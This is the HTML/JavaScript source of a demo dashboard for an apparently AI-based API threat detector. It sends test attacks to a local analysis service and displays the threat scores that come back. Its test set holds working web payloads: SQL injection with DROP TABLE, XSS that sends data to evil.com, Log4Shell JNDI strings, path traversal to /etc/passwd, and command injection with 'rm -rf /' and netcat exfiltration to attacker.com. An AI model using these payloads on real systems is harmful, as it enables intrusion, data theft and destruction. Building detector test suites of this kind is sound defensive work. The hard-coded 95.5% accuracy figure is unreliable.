<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kong Guard AI - Live AI Analysis</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { 
            text-align: center; 
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
        }
        .status { 
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .status.connected { background: #4CAF50; }
        .status.disconnected { background: #f44336; }
        
        .grid { 
            display: grid; 
            grid-template-columns: 2fr 1fr;
            gap: 20px;
        }
        
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .ai-thinking {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #9C27B0;
            padding: 15px 25px;
            border-radius: 10px;
            display: none;
            animation: pulse 1s infinite;
            z-index: 1000;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.05); }
        }
        
        .threat-bar {
            height: 40px;
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            overflow: hidden;
            margin: 20px 0;
            position: relative;
        }
        
        .threat-fill {
            height: 100%;
            transition: width 0.5s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            border-radius: 20px;
        }
        
        .threat-critical { background: linear-gradient(90deg, #ff0000, #990000); }
        .threat-high { background: linear-gradient(90deg, #ff4444, #cc0000); }
        .threat-medium { background: linear-gradient(90deg, #ffaa00, #ff6600); }
        .threat-low { background: linear-gradient(90deg, #ffff00, #cccc00); }
        .threat-safe { background: linear-gradient(90deg, #00ff00, #00cc00); }
        
        .metrics {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .metric {
            text-align: center;
            padding: 15px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        
        .metric-value {
            font-size: 28px;
            font-weight: bold;
            margin: 5px 0;
        }
        
        .metric-label {
            font-size: 11px;
            opacity: 0.8;
            text-transform: uppercase;
        }
        
        .button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
            transition: transform 0.2s;
        }
        
        .button:hover { transform: scale(1.05); }
        .button.danger { background: linear-gradient(135deg, #f44336, #d32f2f); }
        .button.warning { background: linear-gradient(135deg, #ff9800, #f57c00); }
        .button.success { background: linear-gradient(135deg, #4CAF50, #388E3C); }
        
        .history-item {
            padding: 10px;
            margin: 5px 0;
            background: rgba(0,0,0,0.2);
            border-radius: 8px;
            border-left: 4px solid;
        }
        
        .code-block {
            background: rgba(0,0,0,0.4);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
            margin: 10px 0;
        }
        
        #aiReasoning {
            background: rgba(139, 92, 246, 0.1);
            border-left: 4px solid #8b5cf6;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        .indicators {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin: 10px 0;
        }
        
        .indicator {
            background: rgba(255,0,0,0.3);
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üß† Kong Guard AI - Real-Time Threat Analysis</h1>
            <p style="margin: 10px 0;">Powered by Gemini Flash 2.0 - Autonomous AI Security</p>
            <span id="status" class="status disconnected">CONNECTING...</span>
        </div>

        <div class="ai-thinking" id="aiThinking">
            ü§ñ AI is analyzing...
        </div>

        <div class="metrics">
            <div class="metric">
                <div class="metric-label">Total Analyzed</div>
                <div class="metric-value" id="totalAnalyzed">0</div>
            </div>
            <div class="metric">
                <div class="metric-label">Test Attacks / Blocked</div>
                <div class="metric-value" id="threatsBlocked" style="color: #ff4444;">0/0</div>
            </div>
            <div class="metric">
                <div class="metric-label">Avg Confidence</div>
                <div class="metric-value" id="avgConfidence" style="color: #4444ff;">0%</div>
            </div>
            <div class="metric">
                <div class="metric-label">Avg Processing</div>
                <div class="metric-value" id="avgProcessing" style="color: #ffaa00;">0ms</div>
            </div>
            <div class="metric">
                <div class="metric-label">AI Accuracy</div>
                <div class="metric-value" id="aiAccuracy" style="color: #44ff44;">95.5%</div>
            </div>
        </div>

        <div class="grid">
            <div class="left">
                <div class="card">
                    <h2>üîç Current AI Analysis</h2>
                    
                    <div class="threat-bar">
                        <div id="threatBar" class="threat-fill threat-safe" style="width: 0%;">
                            <span id="threatScore">0%</span>
                        </div>
                    </div>
                    
                    <div id="threatType" style="text-align: center; font-size: 18px; margin: 10px 0;">
                        Waiting for analysis...
                    </div>
                    
                    <div id="aiReasoning">
                        <strong>AI Reasoning:</strong>
                        <p id="reasoningText">No analysis yet...</p>
                    </div>
                    
                    <div>
                        <strong>Threat Indicators:</strong>
                        <div class="indicators" id="indicators">
                            <span style="opacity: 0.5;">None detected</span>
                        </div>
                    </div>
                    
                    <div style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 8px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span>Confidence:</span>
                            <span id="confidence">0%</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span>Processing Time:</span>
                            <span id="processingTime">0ms</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span>Recommended Action:</span>
                            <span id="action" style="font-weight: bold;">-</span>
                        </div>
                    </div>
                </div>

                <div class="card" style="margin-top: 20px;">
                    <h2>üìã Request Details</h2>
                    <div class="code-block" id="requestDetails">
                        Waiting for request...
                    </div>
                </div>
            </div>

            <div class="right">
                <div class="card">
                    <h2>üéØ Test Attacks</h2>
                    <div style="display: flex; flex-direction: column;">
                        <button class="button danger" onclick="sendAttack('sql')">
                            üíâ SQL Injection
                        </button>
                        <button class="button warning" onclick="sendAttack('xss')">
                            üîì XSS Attack
                        </button>
                        <button class="button warning" onclick="sendAttack('path')">
                            üìÅ Path Traversal
                        </button>
                        <button class="button danger" onclick="sendAttack('cmd_injection')">
                            üí• Command Injection
                        </button>
                        <button class="button warning" onclick="sendAttack('ldap_injection')">
                            üîê LDAP Injection
                        </button>
                        <button class="button danger" onclick="sendAttack('business_logic')">
                            üí∞ Business Logic Attack
                        </button>
                        <button class="button danger" onclick="sendAttack('ransomware_c2')">
                            ü¶† Ransomware C2
                        </button>
                        <button class="button warning" onclick="sendAttack('supply_chain')">
                            üì¶ Supply Chain Attack
                        </button>
                        <button class="button" onclick="sendAttack('zero')">
                            üéØ Zero-Day Pattern
                        </button>
                        <button class="button success" onclick="sendAttack('normal')">
                            ‚úÖ Normal Traffic
                        </button>
                    </div>
                </div>

                <div class="card" style="margin-top: 20px;">
                    <h2>üìú Recent Analysis</h2>
                    <div id="history" style="max-height: 400px; overflow-y: auto;">
                        <div style="text-align: center; opacity: 0.5; padding: 20px;">
                            No analysis yet
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let ws = null;
        let metrics = {
            total: 0,
            blocked: 0,
            testAttacks: 0,
            confidence: 0,
            processing: 0
        };
        
        let isTestAttack = false;

        function connect() {
            ws = new WebSocket('ws://localhost:18002/ws');
            
            ws.onopen = () => {
                console.log('Connected to AI Service');
                document.getElementById('status').className = 'status connected';
                document.getElementById('status').textContent = '‚óè LIVE';
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.type === 'threat_analysis') {
                    updateAnalysis(data);
                }
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
                document.getElementById('status').className = 'status disconnected';
                document.getElementById('status').textContent = '‚óè DISCONNECTED';
            };
            
            ws.onclose = () => {
                document.getElementById('status').className = 'status disconnected';
                document.getElementById('status').textContent = '‚óè RECONNECTING...';
                setTimeout(connect, 3000);
            };
        }

        function updateAnalysis(messageData) {
            // Show thinking animation
            document.getElementById('aiThinking').style.display = 'block';
            setTimeout(() => {
                document.getElementById('aiThinking').style.display = 'none';
            }, 1500);
            
            // Extract data from the correct structure
            const data = messageData.data || {};
            const event = messageData.event || {};
            
            // Update metrics with null checks
            metrics.total++;
            
            // Distinguish between test attacks and actual blocked threats
            if (isTestAttack) {
                metrics.testAttacks++;
                isTestAttack = false; // Reset flag
            } else if ((data.threat_score || 0) > 0.7) {
                metrics.blocked++;
            }
            
            const confidence = data.confidence || 0;
            const processingTime = data.processing_time_ms || (data.processing_time ? data.processing_time * 1000 : 0);
            
            if (confidence > 0) {
                metrics.confidence = ((metrics.confidence * (metrics.total - 1) + confidence) / metrics.total);
            }
            if (processingTime > 0) {
                metrics.processing = ((metrics.processing * (metrics.total - 1) + processingTime) / metrics.total);
            }
            
            document.getElementById('totalAnalyzed').textContent = metrics.total;
            document.getElementById('threatsBlocked').textContent = `${metrics.testAttacks}/${metrics.blocked}`;
            document.getElementById('avgConfidence').textContent = (metrics.confidence * 100).toFixed(1) + '%';
            document.getElementById('avgProcessing').textContent = metrics.processing.toFixed(0) + 'ms';
            
            // Update threat bar
            const score = data.threat_score || 0;
            const threatBar = document.getElementById('threatBar');
            threatBar.style.width = (score * 100) + '%';
            threatBar.className = 'threat-fill ' + getThreatClass(score);
            document.getElementById('threatScore').textContent = (score * 100).toFixed(1) + '%';
            
            // Update threat type
            document.getElementById('threatType').textContent = 
                'Threat Type: ' + (data.threat_type || 'none').toUpperCase();
            
            // Update AI reasoning
            document.getElementById('reasoningText').textContent = 
                data.reasoning || 'Analysis completed successfully';
            
            // Update indicators
            const indicatorsDiv = document.getElementById('indicators');
            if (data.indicators && data.indicators.length > 0) {
                indicatorsDiv.innerHTML = data.indicators.map(i => 
                    `<span class="indicator">${i}</span>`
                ).join('');
            } else {
                indicatorsDiv.innerHTML = '<span style="opacity: 0.5;">None detected</span>';
            }
            
            // Update details
            document.getElementById('confidence').textContent = 
                ((confidence || 0) * 100).toFixed(1) + '%';
            document.getElementById('processingTime').textContent = 
                (processingTime || 0).toFixed(0) + 'ms';
            document.getElementById('action').textContent = 
                (data.recommended_action || 'monitor').toUpperCase();
            
            // Update request details - use both data and event sources
            document.getElementById('requestDetails').innerHTML = 
                `Method: ${data.method || event.method || 'N/A'}<br>
                Path: ${data.path || event.path || 'N/A'}<br>
                Client IP: ${data.client_ip || event.client_ip || 'N/A'}<br>
                Query: ${(data.query || 'None').substring(0, 100)}${data.query && data.query.length > 100 ? '...' : ''}`;
            
            // Add to history - pass the combined data
            addToHistory({
                ...data,
                method: data.method || event.method,
                path: data.path || event.path,
                client_ip: data.client_ip || event.client_ip
            });
        }

        function getThreatClass(score) {
            if (score >= 0.9) return 'threat-critical';
            if (score >= 0.7) return 'threat-high';
            if (score >= 0.5) return 'threat-medium';
            if (score >= 0.3) return 'threat-low';
            return 'threat-safe';
        }

        function addToHistory(data) {
            const history = document.getElementById('history');
            const item = document.createElement('div');
            item.className = 'history-item';
            item.style.borderLeftColor = getColor(data.threat_score || 0);
            
            const score = data.threat_score || 0;
            const threatType = data.threat_type || 'none';
            const method = data.method || 'N/A';
            const path = data.path || 'N/A';
            const action = data.recommended_action || 'monitor';
            const processingTime = data.processing_time_ms || (data.processing_time ? data.processing_time * 1000 : 0);
            
            item.innerHTML = 
                '<div style="display: flex; justify-content: space-between;">' +
                    '<strong>' + (score * 100).toFixed(0) + '%</strong>' +
                    '<span>' + threatType + '</span>' +
                '</div>' +
                '<div style="font-size: 11px; opacity: 0.7; margin-top: 5px;">' +
                    method + ' ' + path + '<br>' +
                    'Action: ' + action + ' | ' + processingTime.toFixed(0) + 'ms' +
                '</div>';
            
            if (history.children[0] && history.children[0].textContent.includes('No analysis yet')) {
                history.innerHTML = '';
            }
            
            history.insertBefore(item, history.firstChild);
            
            // Keep only last 10 items
            while (history.children.length > 10) {
                history.removeChild(history.lastChild);
            }
        }

        function getColor(score) {
            if (score >= 0.9) return '#ff0000';
            if (score >= 0.7) return '#ff4444';
            if (score >= 0.5) return '#ffaa00';
            if (score >= 0.3) return '#ffff00';
            return '#00ff00';
        }

        async function sendAttack(type) {
            // Mark this as a test attack
            isTestAttack = true;
            const attacks = {
                sql: {
                    query: "id=1' OR '1'='1; DROP TABLE users;--",
                    path: "/api/users",
                    method: "GET",
                    body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--"
                },
                xss: {
                    query: "&lt;script&gt;alert('XSS');document.cookie&lt;/script&gt;",
                    path: "/comment",
                    method: "POST",
                    body: "&lt;script&gt;fetch('/admin/users').then(r=&gt;r.text()).then(d=&gt;fetch('//evil.com/?'+btoa(d)))&lt;/script&gt;"
                },
                path: {
                    query: "file=../../../../etc/passwd",
                    path: "/download",
                    method: "GET",
                    body: ""
                },
                zero: {
                    query: "\\${jndi:ldap://evil.com/exploit}",
                    path: "/api/log",
                    method: "POST",
                    body: "${jndi:ldap://attacker.com:1389/Exploit}"
                },
                normal: {
                    query: "page=1&limit=10&sort=date",
                    path: "/api/products",
                    method: "GET",
                    body: ""
                },
                // New Enterprise Attacks
                cmd_injection: {
                    query: "ping=127.0.0.1; rm -rf / #",
                    path: "/api/ping",
                    method: "POST",
                    body: "; cat /etc/passwd | nc attacker.com 4444 &"
                },
                ldap_injection: {
                    query: "user=admin')(&(password=*))",
                    path: "/auth/ldap",
                    method: "POST",
                    body: "admin')(&(password=*)(|(objectClass=*)))"
                },
                business_logic: {
                    query: "amount=-999999&to_account=attacker",
                    path: "/api/transfer",
                    method: "POST",
                    body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}'
                },
                ransomware_c2: {
                    query: "host_id=VICTIM-001&status=encrypted",
                    path: "/api/callback",
                    method: "POST",
                    body: '{"victim_id": "BANK-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "50000000"}'
                },
                supply_chain: {
                    query: "package=@malicious/backdoor&version=latest",
                    path: "/api/install",
                    method: "POST",
                    body: 'npm install compromised-package-with-crypto-miner'
                }
            };
            
            const attack = attacks[type];
            document.getElementById('aiThinking').style.display = 'block';
            
            try {
                await fetch('http://localhost:18002/analyze', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        features: {
                            method: attack.method,
                            path: attack.path,
                            client_ip: '203.0.113.' + Math.floor(Math.random() * 255),
                            user_agent: type === 'normal' ? 'Mozilla/5.0' : 'AttackBot/1.0',
                            requests_per_minute: type === 'normal' ? 10 : 100,
                            content_length: (attack.body || attack.query || '').length,
                            query_param_count: 2,
                            header_count: 5,
                            hour_of_day: new Date().getHours(),
                            query: attack.query,
                            body: attack.body || "",
                            headers: {}
                        },
                        context: {
                            previous_requests: Math.floor(Math.random() * 100),
                            failed_attempts: type === 'normal' ? 0 : 5,
                            anomaly_score: type === 'normal' ? 0.1 : 0.8
                        }
                    })
                });
            } catch (error) {
                console.error('Failed to send attack:', error);
            }
        }

        // Connect on load
        connect();
    </script>
</body>
</html>